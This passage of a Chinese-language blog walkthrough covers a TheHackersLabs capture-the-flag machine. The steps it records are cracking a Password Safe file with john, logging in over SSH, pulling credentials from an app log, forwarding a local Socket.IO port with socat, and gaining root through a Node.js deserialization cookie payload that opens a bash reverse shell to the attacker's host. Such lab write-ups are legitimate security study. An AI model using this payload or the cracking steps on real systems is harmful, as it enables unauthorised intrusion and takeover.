+drwx------ 1 root root 4096 Aug 24 18:39 <span class="pl-c1">.</span>
+drwxr-xr-x 1 root root 4096 Oct 11 18:41 ..
+-rw-r--r-- 1 root root  607 May 12 19:25 .bashrc
+-rw-r--r-- 1 root root  132 May 12 19:25 .profile
+drwx------ 2 root root 4096 Aug 24 18:38 .ssh
+-rw-r--r-- 1 root root 1656 Aug 22 16:02 secrets.psafe3</pre></div>
+<p>传去kali</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">root@153504fd9bcb:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> scp secrets.psafe3 kali@192.168.205.128:/mnt/hgfs/gx/x/tmp</span>
+...
+secrets.psafe3                               100% 1656   749.5KB/s   00:00 </pre></div>
+<p>pwsafe查看</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/07a12457917c393ef4869b662c9ce6523ffa2a52d9e368ebc3f52621591d66c6/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235313031393134353632383438312e77656270"><img src="https://camo.githubusercontent.com/07a12457917c393ef4869b662c9ce6523ffa2a52d9e368ebc3f52621591d66c6/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235313031393134353632383438312e77656270" alt="image-20251019125219858" data-canonical-src="http://7r1UMPHK.github.io/image/20251019145628481.webp" style="max-width: 100%;"></a></p>
+<p>要密码，爆破一下</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ pwsafe2john secrets.psafe3 <span class="pl-k">&gt;</span> <span class="pl-c1">hash</span>
+                                                                           
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt <span class="pl-c1">hash</span>
+...
+rockandroll      (secret)     
+...</pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/6a49e1e0ed73d9ce5be1213380a2102ae41dc8b23ca3ba9be37b573a6a4b5a80/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235313031393134353633303238342e77656270"><img src="https://camo.githubusercontent.com/6a49e1e0ed73d9ce5be1213380a2102ae41dc8b23ca3ba9be37b573a6a4b5a80/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235313031393134353633303238342e77656270" alt="image-20251019125504831" data-canonical-src="http://7r1UMPHK.github.io/image/20251019145630284.webp" style="max-width: 100%;"></a></p>
+<p>获得cisco密码：<code class="notranslate">sMpam!dE#8@$$1P%bnV@fFxdqjFFG#</code></p>
+<p>登录</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ ssh cisco@192.168.205.136
+cisco@192.168.205.136<span class="pl-s"><span class="pl-pds">'</span>s password: </span>
+<span class="pl-s">Linux allsafe 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64</span>
+<span class="pl-s"> █████╗ ██╗     ██╗     ███████╗ █████╗ ███████╗███████╗</span>
+<span class="pl-s">██╔══██╗██║     ██║     ██╔════╝██╔══██╗██╔════╝██╔════╝</span>
+<span class="pl-s">███████║██║     ██║     ███████╗███████║█████╗  █████╗  </span>
+<span class="pl-s">██╔══██║██║     ██║     ╚════██║██╔══██║██╔══╝  ██╔══╝  </span>
+<span class="pl-s">██║  ██║███████╗███████╗███████║██║  ██║██║     ███████╗</span>
+<span class="pl-s">╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝</span>
+<span class="pl-s">Last login: Fri Aug 22 23:59:20 2025 from 192.168.1.19</span>
+<span class="pl-s">cisco@allsafe:~$ id</span>
+<span class="pl-s">uid=1002(cisco) gid=1002(cisco) grupos=1002(cisco)</span>
+<span class="pl-s">cisco@allsafe:~$ sudo -l</span>
+<span class="pl-s">sudo: unable to resolve host allsafe: Nombre o servicio desconocido</span>
+<span class="pl-s">[sudo] contraseña para cisco: </span>
+<span class="pl-s">Sorry, user cisco may not run sudo on allsafe.</span>
+<span class="pl-s">cisco@allsafe:~$ ls -al</span>
+<span class="pl-s">total 32</span>
+<span class="pl-s">drwxr-xr-x 2 cisco cisco 4096 oct 11 20:46 .</span>
+<span class="pl-s">drwxr-xr-x 4 root  root  4096 ago 21 15:30 ..</span>
+<span class="pl-s">lrwxrwxrwx 1 root  root     9 ago 22 17:20 .bash_history -&gt; /dev/null</span>
+<span class="pl-s">-rw-r--r-- 1 cisco cisco  220 abr 23  2023 .bash_logout</span>
+<span class="pl-s">-rw-r--r-- 1 cisco cisco 3526 abr 23  2023 .bashrc</span>
+<span class="pl-s">-rw-r--r-- 1 root  root    37 ago 22 00:48 darkarmy.bin</span>
+<span class="pl-s">-rw-r--r-- 1 cisco cisco  807 abr 23  2023 .profile</span>
+<span class="pl-s">-rw-r--r-- 1 root  root   342 ago 22 00:38 .unknown</span>
+<span class="pl-s">-rw-r--r-- 1 root  root    33 oct 11 20:46 user.txt</span>
+<span class="pl-s">cisco@allsafe:~$ cat user.txt</span>
+<span class="pl-s">e8c459b5b46f5722effe5f2f64421ef3</span>
+<span class="pl-s">cisco@allsafe:~$ strings darkarmy.bin</span>
+<span class="pl-s">70617373776f72643d64726b32303235210a</span></pre></div>
+<p>CyberChef看了一下，还是hex，解除<code class="notranslate">password=drk2025!</code></p>
+<p>密码都不对，骗人的</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">cisco@allsafe:<span class="pl-k">~</span>$ ss -tulnp        
+...
+tcp              LISTEN             0                  511                                127.0.0.1:3000                               0.0.0.0:<span class="pl-k">*</span>     ...                             
+cisco@allsafe:<span class="pl-k">~</span>$ ls- al
+-bash: ls-: orden no encontrada
+cisco@allsafe:<span class="pl-k">~</span>$ ls -al
+total 32
+drwxr-xr-x 2 cisco cisco 4096 oct 11 20:46 <span class="pl-c1">.</span>
+drwxr-xr-x 4 root  root  4096 ago 21 15:30 ..
+lrwxrwxrwx 1 root  root     9 ago 22 17:20 .bash_history -<span class="pl-k">&gt;</span> /dev/null
+-rw-r--r-- 1 cisco cisco  220 abr 23  2023 .bash_logout
+-rw-r--r-- 1 cisco cisco 3526 abr 23  2023 .bashrc
+-rw-r--r-- 1 root  root    37 ago 22 00:48 darkarmy.bin
+-rw-r--r-- 1 cisco cisco  807 abr 23  2023 .profile
+-rw-r--r-- 1 root  root   342 ago 22 00:38 .unknown
+-rw-r--r-- 1 root  root    33 oct 11 20:46 user.txt
+cisco@allsafe:<span class="pl-k">~</span>$ cat .unknown
+Si quieres comunicarte con nosotros, no vuelvas a usar los canales habituales.
+A partir de ahora, todo contacto será únicamente a través del canal seguro.
+
+Conéctate al servidor de mensajería y entra en la sala:
+    dark-ops
+
+No intentes usar este acceso para nada más que lo acordado.  
+Nosotros decidimos cuándo y cómo se conversa.</pre></div>
+<p>经过查看，端口3000是基于 Socket.IO 的聊天应用，我们转发出去</p>
+<h1>8. <strong>端口转发与日志分析</strong></h1>
+<div class="highlight highlight-source-shell"><pre class="notranslate">cisco@allsafe:<span class="pl-k">~</span>$ busybox wget 192.168.205.128/socat
+Connecting to 192.168.205.128 (192.168.205.128:80)
+saving to <span class="pl-s"><span class="pl-pds">'</span>socat<span class="pl-pds">'</span></span>
+socat                100% <span class="pl-k">|</span><span class="pl-k">**********************************************************************************************************************************</span><span class="pl-k">|</span> 4724k  0:00:00 ETA
+<span class="pl-s"><span class="pl-pds">'</span>socat<span class="pl-pds">'</span></span> saved
+cisco@allsafe:<span class="pl-k">~</span>$ chmod +x socat
+cisco@allsafe:<span class="pl-k">~</span>$ ./socat TCP-LISTEN:3001,fork TCP4:127.0.0.1:3000 <span class="pl-k">&amp;</span>
+[1] 2001</pre></div>
+<p>没问题，可以访问</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/65170d0d968d4bd9306d02999863db580f36d49d8c5af04e7a112cb2b5aeb190/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235313031393134353633343035322e77656270"><img src="https://camo.githubusercontent.com/65170d0d968d4bd9306d02999863db580f36d49d8c5af04e7a112cb2b5aeb190/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235313031393134353633343035322e77656270" alt="image-20251019130446534" data-canonical-src="http://7r1UMPHK.github.io/image/20251019145634052.webp" style="max-width: 100%;"></a></p>
+<p>测试我们刚刚拿到了信息</p>
+<pre class="notranslate"><code class="notranslate">Gideon
+dark-ops
+6D7033386E71556654416130494D314F70306157
+</code></pre>
+<p>不行，那就是还有东西我们没找到<br>
+扒拉了一个查看修改时间的软件，发现了这个</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">/var/log/app.log         2025-08-22   -rwxr-xr-x         1654</pre></div>
+<p>我们可读</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">cisco@allsafe:/tmp$ cat /var/log/app.log
+2025-08-21T12:01:11.233Z [INFO] Server started on port 3000 (PID 2234)
+2025-08-21T12:01:11.235Z [DEBUG] Connected to MySQL at mysql-db:3306
+2025-08-21T12:01:12.004Z [WARN] DeprecationWarning: <span class="pl-en">uuid.v1</span>() is deprecated. Use <span class="pl-en">uuid.v4</span>()
+2025-08-21T12:01:13.551Z [INFO] GET /healthcheck 200 - 2ms
+2025-08-21T12:01:14.232Z [INFO] GET /favicon.ico 404 - 3ms
+2025-08-21T12:01:19.998Z [DEBUG] Cache miss <span class="pl-k">for</span> key: session:oparker
+2025-08-21T12:01:20.012Z [INFO] POST /login 401 - 45ms - user=oparker
+2025-08-21T12:01:20.014Z [ERROR] Invalid credentials <span class="pl-k">for</span> user=oparker ip=10.0.0.12
+
+2025-08-21T12:01:35.783Z [INFO] POST /auth 401 - 62ms - user=shadow
+2025-08-21T12:01:35.784Z [DEBUG] Authentication failed <span class="pl-k">for</span> user shadow using password=123456
+2025-08-21T12:01:36.001Z [WARN] Too many failed attempts <span class="pl-k">for</span> user=shadow from 10.0.0.55
+
+2025-08-21T12:01:40.152Z [INFO] POST /auth 200 - 38ms - user=cisco
+2025-08-21T12:01:40.153Z [DEBUG] Authentication success: password=DLFJYxLLSzp1x5Ttpsffpg2awuJT5K
+2025-08-21T12:01:40.155Z [INFO] Joined secure channel: dark-ops
+
+2025-08-21T12:01:41.998Z [DEBUG] Socket.io message from user=shadow: <span class="pl-s"><span class="pl-pds">"</span>system ready<span class="pl-pds">"</span></span>
+2025-08-21T12:01:42.112Z [INFO] GET /api/clients 200 - 14ms
+2025-08-21T12:01:43.550Z [ERROR] UnhandledPromiseRejectionWarning: TypeError: Cannot <span class="pl-c1">read</span> property <span class="pl-s"><span class="pl-pds">'</span>id<span class="pl-pds">'</span></span> of undefined
+2025-08-21T12:01:43.551Z [INFO] Trace: at /srv/app/routes.js:77:19
+2025-08-21T12:01:44.992Z [DEBUG] Cache hit <span class="pl-k">for</span> key: client:ecorp
+2025-08-21T12:01:45.011Z [INFO] POST /reports/upload 500 - 132ms - user=parker
+2025-08-21T12:01:45.012Z [ERROR] Error: File too large (<span class="pl-k">&gt;</span>5MB)
+2025-08-21T12:01:46.200Z [DEBUG] Session destroyed <span class="pl-k">for</span> user=oparker</pre></div>
+<p>分析/var/log/app.log获得认证信息</p>
+<pre class="notranslate"><code class="notranslate">cisco
+dark-ops
+DLFJYxLLSzp1x5Ttpsffpg2awuJT5K
+</code></pre>
+<p>登录成功，我去中文？！</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/edc09bcadde550eec23c5e1a02625b197b28f88e13cf11ec54fd28e46865cc9f/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235313031393134353633363838332e77656270"><img src="https://camo.githubusercontent.com/edc09bcadde550eec23c5e1a02625b197b28f88e13cf11ec54fd28e46865cc9f/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235313031393134353633363838332e77656270" alt="image-20251019130950990" data-canonical-src="http://7r1UMPHK.github.io/image/20251019145636883.webp" style="max-width: 100%;"></a></p>
+<p>没啥东西，测试了ssti之类的也没啥东西</p>
+<p>抓个包看看</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">GET / HTTP/1.1
+Host: 192.168.205.136:3001
+User-Agent: Mozilla/5.0 (Windows NT 10.0<span class="pl-k">;</span> Win64<span class="pl-k">;</span> x64<span class="pl-k">;</span> rv:144.0) Gecko/20100101 Firefox/144.0
+Accept: text/html,application/xhtml+xml,application/xml<span class="pl-k">;</span>q=0.9,<span class="pl-k">*</span>/<span class="pl-k">*</span><span class="pl-k">;</span>q=0.8
+Accept-Language: zh-CN,zh<span class="pl-k">;</span>q=0.8,zh-TW<span class="pl-k">;</span>q=0.7,zh-HK<span class="pl-k">;</span>q=0.5,en-US<span class="pl-k">;</span>q=0.3,en<span class="pl-k">;</span>q=0.2
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Cookie: sess=eyJ1c2VybmFtZSI6ImNpc2NvIn0%3D
+Upgrade-Insecure-Requests: 1
+If-Modified-Since: Wed, 20 Aug 2025 13:34:08 GMT
+If-None-Match: W/<span class="pl-s"><span class="pl-pds">"</span>3ce-198c7afdc80<span class="pl-pds">"</span></span>
+Priority: u=0, i</pre></div>
+<p>Cookie这个jwt也太短了吧</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/c1aafbf0dcd7575dab47434bd1280d7aeffb8b05b4ec1cc3b435a6bb8e7d4f1b/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235313031393134353633393735312e77656270"><img src="https://camo.githubusercontent.com/c1aafbf0dcd7575dab47434bd1280d7aeffb8b05b4ec1cc3b435a6bb8e7d4f1b/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235313031393134353633393735312e77656270" alt="image-20251019131355893" data-canonical-src="http://7r1UMPHK.github.io/image/20251019145639751.webp" style="max-width: 100%;"></a></p>
+<p>啊这，伪造也没啥价值</p>
+<p>问了波ai，说可能是 <strong>Node.js反序列化漏洞</strong></p>
+<h1><strong>9. Node.js反序列化RCE</strong></h1>
+<div class="highlight highlight-source-json"><pre class="notranslate">{
+  <span class="pl-ent">"username"</span>: <span class="pl-s"><span class="pl-pds">"</span>_$$ND_FUNC$$_function(){require('child_process').exec(<span class="pl-cce">\"</span>bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.205.128/8888 0&gt;&amp;1'<span class="pl-cce">\"</span>);}()<span class="pl-pds">"</span></span>
+}</pre></div>
+<p>base编码+url编码</p>
+<pre class="notranslate"><code class="notranslate">ew0KICAidXNlcm5hbWUiOiAiXyQkTkRfRlVOQyQkX2Z1bmN0aW9uKCl7cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoXCJiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMjA1LjEyOC84ODg4IDA%2BJjEnXCIpO30oKSINCn0%3D
+</code></pre>
+<p>kali监听</p>
+<p>关键利用包，替换到 Socket.IO 轮询请求</p>
+<pre class="notranslate"><code class="notranslate">POST /socket.io/?EIO=4&amp;transport=polling&amp;t=a7m0hv65&amp;sid=Zr2kizcum7IVICx8AAAc HTTP/1.1
+Host: 192.168.205.136:3001
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0
+Accept: */*
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate, br
+Content-type: text/plain;charset=UTF-8
+Content-Length: 49
+Origin: http://192.168.205.136:3001
+Connection: keep-alive
+Cookie: sess=ew0KICAidXNlcm5hbWUiOiAiXyQkTkRfRlVOQyQkX2Z1bmN0aW9uKCl7cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoXCJiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMjA1LjEyOC84ODg4IDA%2BJjEnXCIpO30oKSINCn0%3D
+
+40{"username":"anon","room":"general","token":""}
+</code></pre>
+<p>监听并获取反弹 shell：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nc -lvnp 8888                                                                                                                                                                
+listening on [any] 8888 ...
+connect to [192.168.205.128] from (UNKNOWN) [192.168.205.136] 41224
+bash: no se puede establecer el grupo de proceso de terminal (377): Función ioctl no apropiada para el dispositivo
+bash: no hay control de trabajos en este shell
+root@allsafe:<span class="pl-k">~</span>/app/src# id
+id
+uid=0(root) gid=0(root) grupos=0(root)
+root@allsafe:<span class="pl-k">~</span>/app/src# <span class="pl-c1">cd</span>  
+<span class="pl-c1">cd</span>
+root@allsafe:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> cat /root/root.txt   </span>
+cat /root/root.txt
+74d1b217518f030ed2c911f77413f394
+root@allsafe:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> find / -name 'user.txt' 2&gt;/dev/null</span>
+find / -name <span class="pl-s"><span class="pl-pds">'</span>user.txt<span class="pl-pds">'</span></span> <span class="pl-k">2&gt;</span>/dev/null
+/home/cisco/user.txt
+root@allsafe:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> cat /home/cisco/user.txt</span>
+cat /home/cisco/user.txt
+e8c459b5b46f5722effe5f2f64421ef3</pre></div>
+<h1>10. 聊聊</h1>
+<p>thehackerslabs的强度又起来了，好事</p>
+<p>它的网址是：<a href="https://labs.thehackerslabs.com/" rel="nofollow">https://labs.thehackerslabs.com/</a></p>
+<p>想打的可以打打</p></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPHK.github.io">TriumphK Blog</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+console.log("\n %c Gmeek main https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.disabled=true;
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","7r1UMPHK/7r1UMPHK.github.io");
+    script.setAttribute("issue-term","title");
+    
+    script.setAttribute("theme","github-light");
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
+
+</html>
